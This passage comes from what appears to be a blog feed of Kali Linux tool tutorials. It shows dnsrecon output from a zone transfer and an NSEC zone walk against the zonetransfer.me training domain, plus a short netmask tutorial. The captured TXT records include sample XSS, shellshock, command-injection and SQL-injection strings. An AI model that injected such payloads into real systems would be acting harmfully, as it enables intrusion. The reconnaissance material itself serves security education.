[*]      DNSKEY RSASHA256 256 03010001d779d1f1daf7054a21ff7f82 93a1171dcd06adf6586abf4b2911354c 123273d4dce3a44735132842fecb1768 011bcbfe96d1fb9a4add600e573b0b29 dcb7fb178ba9f20b7606353f49ac8d55 d734dda898157e1ecd8b8a9eea4b8464 6091e0f8eabc4568b1a5e092009d7f0e 448b136d076188aadbb6b4ee9344a1cf 8e7cd79f 3
[*]      DNSKEY RSASHA256 257 03010001e14b3915ec8b1107d9fb66e6 8a3855023ae83eb3301ade8a7cac4ddc 798ce560740b4e6b723a2f7c9eee55d9 1496dd9cf670d30d1d7f636f59b2070f 32024316c98d74d4916b8dd30b979bd7 fa0453fc55c35af273e6d78176fbab9e f9c331c8c397656ff8bedd8357986c1f e94d590c4655e4c574289f52562db0f9 68c6ca581134f9be1aae2a3fd535aae2 45e717d334f3c8cebb17e82b091f9c52 8ef90a765a45b5591bb808050efcded5 4ee6d150094263ab0df33b57fa790a7f c64e2b368ac22bb043aa2b6051ba5d3e e1610aa99c29562c16b11588d6da23f3 64f652471fe9d0698052671f9c5ab4cb 3d9b64369dda86a63780bc00d115207d 86425a75 3
[*]      NSEC _sip._tcp
[*]      NSEC sqli
[*]      NSEC vpn
[*]      NSEC asfdbbox
[*]      NSEC deadbeef
[*]      NSEC intns1
[*]      NSEC 157.177.147.217.IN-ADDR.ARPA
[*]      NSEC asfdbauthdns
[*]      NSEC dc-office
[*]      NSEC alltcpportsopen.firewall.test
[*]      NSEC canberra-office
[*]      NSEC robinwood
[*]      NSEC testing
[*]      NSEC www
[*]      NSEC Info
[*]      NSEC dr
[*]      NSEC @
[*]      NSEC asfdbvolume
[*]      NSEC xss
[*]      NSEC email
[*]      NSEC internal
[*]      NSEC cmdexec
[*]      NSEC intns2
[*]      NSEC office
[*]      NSEC contact
[*]      NSEC owa
[*]      NSEC staging
[*]      NSEC sshock
[*]      NSEC sip
[*]      NSEC rp
[*]      NSEC DZC
[*]      NSEC ipv6actnow.org
[*] Checking for Zone Transfer for zonetransfer.me name servers
[*] Resolving SOA Record
[*]      SOA nsztm1.digi.ninja 81.4.108.41
[*] Resolving NS Records
[*] NS Servers found:
[*]     NS nsztm2.digi.ninja 167.88.42.94
[*]     NS nsztm1.digi.ninja 81.4.108.41
[*] Removing any duplicate NS server IP Addresses...
[*]  
[*] Trying NS server 167.88.42.94
[-] Zone Transfer Failed for 167.88.42.94!
[-] Port 53 TCP is being filtered
[*]  
[*] Trying NS server 81.4.108.41
[*] 81.4.108.41 Has port 53 TCP Open
[*] Zone Transfer was successful!!
[*]      SOA nsztm1.digi.ninja 81.4.108.41
[*]      NS nsztm1.digi.ninja 81.4.108.41
[*]      NS nsztm2.digi.ninja 167.88.42.94
[*]      NS intns1.zonetransfer.me 167.88.42.94
[*]      NS intns2.zonetransfer.me 167.88.42.94
[*]      TXT google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA
[*]      TXT Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes
[*]      TXT '&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;
[*]      TXT AbCdEfG
[*]      TXT ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.
[*]      TXT ; ls
[*]      TXT () { :]}; echo ShellShocked
[*]      TXT ' or 1=1 --
[*]      TXT Robin Wood
[*]      PTR www.zonetransfer.me 217.147.177.157
[*]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 64.233.166.26
[*]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 2a00:1450:400c:c07::1a
[*]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 173.194.221.27
[*]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 2a00:1450:4010:c0a::1b
[*]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 74.125.130.27
[*]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 2404:6800:4003:c01::1b
[*]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 173.194.221.26
[*]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 2a00:1450:4010:c0b::1b
[*]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 74.125.130.26
[*]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 2404:6800:4003:c01::1b
[*]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 108.177.97.27
[*]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 2404:6800:4008:c00::1b
[*]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 74.125.28.27
[*]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 2607:f8b0:400e:c04::1b
[*]      AAAA deadbeef.zonetransfer.me dead:beaf::
[*]      AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
[*]      A @.zonetransfer.me 217.147.177.157
[*]      A dc-office.zonetransfer.me 143.228.181.132
[*]      A owa.zonetransfer.me 207.46.197.32
[*]      A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
[*]      A vpn.zonetransfer.me 174.36.59.154
[*]      A email.zonetransfer.me 74.125.206.26
[*]      A asfdbbox.zonetransfer.me 127.0.0.1
[*]      A www.zonetransfer.me 217.147.177.157
[*]      A canberra-office.zonetransfer.me 202.14.81.230
[*]      A intns1.zonetransfer.me 167.88.42.94
[*]      A intns2.zonetransfer.me 167.88.42.94
[*]      A office.zonetransfer.me 4.23.39.254
[*]      CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 52.64.62.190
[*]      CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 13.54.224.164
[*]      SRV _sip._tcp.zonetransfer.me www 5060 0 no_ip
[*]      HINFO Casio fx-700G Windows XP
[*]      RP robin robinwood
[*]      AFSDB 1 asfdbbox
[*]      AFSDB 1 asfdbbox
[*]      LOC 53 20 56.558 N 1 38 33.526 W 0.00m
[*]      NAPTR P 2 3 !^.*$!sip:customer-service@zonetransfer.me! . E2U+sip
[*]      NAPTR P 1 1  email.zonetransfer.me E2U+email
[*]      DNSKEY RSASHA256 256 03010001d5deaa18c99ca1dccd489f0b df0dcf6c60db133a0d77b424413774d7 a718dca807252bc46da6428672efc976 3ec86373f80ac1c4e36b01ca788f3f68 ed7ac4ff671b8a602b2c9b2cf24df57b c9455e6d5c5a24e3c8360cf6debb4fd3 3cda156002eb31eaeeab1146bff6bf46 28f32b1add13712a95ed7dd3ace09d77 f8de190b 3
[*]      DNSKEY RSASHA256 256 03010001d779d1f1daf7054a21ff7f82 93a1171dcd06adf6586abf4b2911354c 123273d4dce3a44735132842fecb1768 011bcbfe96d1fb9a4add600e573b0b29 dcb7fb178ba9f20b7606353f49ac8d55 d734dda898157e1ecd8b8a9eea4b8464 6091e0f8eabc4568b1a5e092009d7f0e 448b136d076188aadbb6b4ee9344a1cf 8e7cd79f 3
[*]      DNSKEY RSASHA256 257 03010001e14b3915ec8b1107d9fb66e6 8a3855023ae83eb3301ade8a7cac4ddc 798ce560740b4e6b723a2f7c9eee55d9 1496dd9cf670d30d1d7f636f59b2070f 32024316c98d74d4916b8dd30b979bd7 fa0453fc55c35af273e6d78176fbab9e f9c331c8c397656ff8bedd8357986c1f e94d590c4655e4c574289f52562db0f9 68c6ca581134f9be1aae2a3fd535aae2 45e717d334f3c8cebb17e82b091f9c52 8ef90a765a45b5591bb808050efcded5 4ee6d150094263ab0df33b57fa790a7f c64e2b368ac22bb043aa2b6051ba5d3e e1610aa99c29562c16b11588d6da23f3 64f652471fe9d0698052671f9c5ab4cb 3d9b64369dda86a63780bc00d115207d 86425a75 3
[*]      NSEC _sip._tcp
[*]      NSEC sqli
[*]      NSEC vpn
[*]      NSEC asfdbbox
[*]      NSEC deadbeef
[*]      NSEC intns1
[*]      NSEC 157.177.147.217.IN-ADDR.ARPA
[*]      NSEC asfdbauthdns
[*]      NSEC dc-office
[*]      NSEC alltcpportsopen.firewall.test
[*]      NSEC canberra-office
[*]      NSEC robinwood
[*]      NSEC testing
[*]      NSEC www
[*]      NSEC Info
[*]      NSEC dr
[*]      NSEC @
[*]      NSEC asfdbvolume
[*]      NSEC xss
[*]      NSEC email
[*]      NSEC internal
[*]      NSEC cmdexec
[*]      NSEC intns2
[*]      NSEC office
[*]      NSEC contact
[*]      NSEC owa
[*]      NSEC staging
[*]      NSEC sshock
[*]      NSEC sip
[*]      NSEC rp
[*]      NSEC DZC
[*]      NSEC ipv6actnow.org
[-] A timeout error occurred please make sure you can reach the target DNS Servers
[-] directly and requests are not being filtered. Increase the timeout from 3.0 second
[-] to a higher number with --lifetime &lt;time&gt; option.
</code></p>

<p>Here we see some interesting records that might warrant an additional explanation:</p>

<p><strong>SOA</strong> &ndash; the State of Authority record indicates which DNS server is the best source of information for the specified domain</p>

<p><strong>HINFO</strong> specifies the host / server&rsquo;s type of CPU and operating system. We can see a Casio here, which is highly unlikely xD</p>

<p><strong>LOC</strong> &ndash; geolocation information, here in latitude / longitude values</p>

<p><strong>TXT</strong> &ndash; text records, with plenty of information like mail addresses, phone numbers, XSS and shellshock attempts</p>

<ul>
<li>map internal network with DNSSEC zone walk</li>
</ul>


<p><code>
dnsrecon -d zonetransfer.me -z
[...]
[*] Performing NSEC Zone Walk for zonetransfer.me
[*] Getting SOA record for zonetransfer.me
[*] Name Server 81.4.108.41 will be used
[*]      A zonetransfer.me 217.147.177.157
[*]      SRV _sip._tcp.zonetransfer.me www.zonetransfer.me 217.147.177.157 5060 0
[*]      A 157.177.147.217.IN-ADDR.ARPA.zonetransfer.me no_ip
[*]      A asfdbauthdns.zonetransfer.me no_ip
[*]      A asfdbbox.zonetransfer.me 127.0.0.1
[*]      A asfdbvolume.zonetransfer.me no_ip
[*]      A canberra-office.zonetransfer.me 202.14.81.230
[*]      A cmdexec.zonetransfer.me no_ip
[*]      A contact.zonetransfer.me no_ip
[*]      A dc-office.zonetransfer.me 143.228.181.132
[*]      AAAA deadbeef.zonetransfer.me dead:beaf::
[*]      A dr.zonetransfer.me no_ip
[*]      A DZC.zonetransfer.me no_ip
[*]      A email.zonetransfer.me 74.125.206.26
[*]      A Info.zonetransfer.me no_ip
[*]      A internal.zonetransfer.me no_ip
[*]      A intns1.zonetransfer.me 167.88.42.94
[*]      A intns2.zonetransfer.me 167.88.42.94
[*]      A office.zonetransfer.me 4.23.39.254
[*]      AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
[*]      A owa.zonetransfer.me 207.46.197.32
[*]      A robinwood.zonetransfer.me no_ip
[*]      A rp.zonetransfer.me no_ip
[*]      A sip.zonetransfer.me no_ip
[*]      A sqli.zonetransfer.me no_ip
[*]      A sshock.zonetransfer.me no_ip
[*]      A staging.zonetransfer.me 52.64.62.190
[*]      A staging.zonetransfer.me 13.54.224.164
[*]      A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
[*]      CNAME testing.zonetransfer.me www.zonetransfer.me
[*]      A www.zonetransfer.me 217.147.177.157
[*]      A vpn.zonetransfer.me 174.36.59.154
[*]      A www.zonetransfer.me 217.147.177.157
[*]      A xss.zonetransfer.me no_ip
[*] 34 records found
</code></p>

<ul>
<li>sample CSV</li>
</ul>


<p><img class="center" src="/images/tools/dnsrecon.png" title="&lsquo;dnsrecon&rsquo; &lsquo;dnsrecon CSV report&rsquo;" ></p>

<p>```</p>

<hr />

<p>/ The only way to keep your health is to  \
| eat what you don&rsquo;t want, drink what you |
| don&rsquo;t like, and do what you&rsquo;d rather    |
| not.                                    |
|                                         |
\ &mdash; Mark Twain                           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[netmask - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/07/netmask-kali-linux-tools/"/>
    <updated>2017-07-07T05:55:22-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/07/netmask-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to convert between different types of netmasks and network addresses, or generate optimized netmasks for firewall rules. netmask can take care of your netmasks!</p>

<p>Homepage: <a href="https://github.com/tlby/netmask">https://github.com/tlby/netmask</a></p>

<!-- more -->


<h2>netmask description</h2>

<blockquote><p>This  program  accepts and produces a variety of common network address
and netmask formats.  Not only can it convert address and netmask notations,  but it will optimize the masks to
generate the smallest list of rules.  This is very handy if you&rsquo;ve  ever  configured  a  firewall  or
router  and  some  nasty  network administrator before you decided that
base 10 numbers were good places to start and end groups of machines.</p></blockquote>

<p>Manpage: <a href="https://linux.die.net/man/1/netmask">https://linux.die.net/man/1/netmask</a></p>

<h2>netmask options</h2>

<p>```
This is netmask, an address netmask generation utility
Usage: netmask spec [spec &hellip;]
  -h, &mdash;help            Print a summary of the options
  -v, &mdash;version         Print the version number
  -d, &mdash;debug           Print status/progress information
  -s, &mdash;standard        Output address/netmask pairs
  -c, &mdash;cidr            Output CIDR format address lists
  -i, &mdash;cisco           Output Cisco style address lists
  -r, &mdash;range           Output ip address ranges
  -x, &mdash;hex         Output address/netmask pairs in hex
  -o, &mdash;octal           Output address/netmask pairs in octal
  -b, &mdash;binary          Output address/netmask pairs in binary
  -n, &mdash;nodns           Disable DNS lookups for addresses
  -f, &mdash;files           Treat arguments as input files
Definitions:
  a spec can be any of:</p>

<pre><code>address
address:address
address:+address
address/mask
</code></pre>

<p>  an address can be any of:</p>

<pre><code>N       decimal number
0N      octal number
0xN     hex number
N.N.N.N dotted quad
hostname    dns domain name
</code></pre>

<p>  a mask is the number of bits set to one from the left
```</p>

<h2>netmask usage</h2>

<ul>
<li>output standard address / netmask pairs</li>
</ul>


<p><code>
root@kali:~# netmask -s 192.168.217.0/24
  192.168.217.0/255.255.255.0  
</code></p>

<ul>
<li>CIDR notation</li>
</ul>


<p><code>
root@kali:~# netmask -c google.com
  216.58.210.14/32
2a00:1450:4001:81d::200e/128
</code></p>

<ul>
<li>Cisco-style notation</li>
</ul>


<p><code>
root@kali:~# netmask -i google.com
  216.58.210.14 0.0.0.0        
2a00:1450:4001:81d::200e ::   
</code></p>

<ul>
<li>IP ranges</li>
</ul>


<p><code>
root@kali:~# netmask -r 192.168.217.0/24
  192.168.217.0-192.168.217.255 (256)
</code></p>

<p>```</p>

<hr />

<p>&lt; Your ignorance cramps my conversation. ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
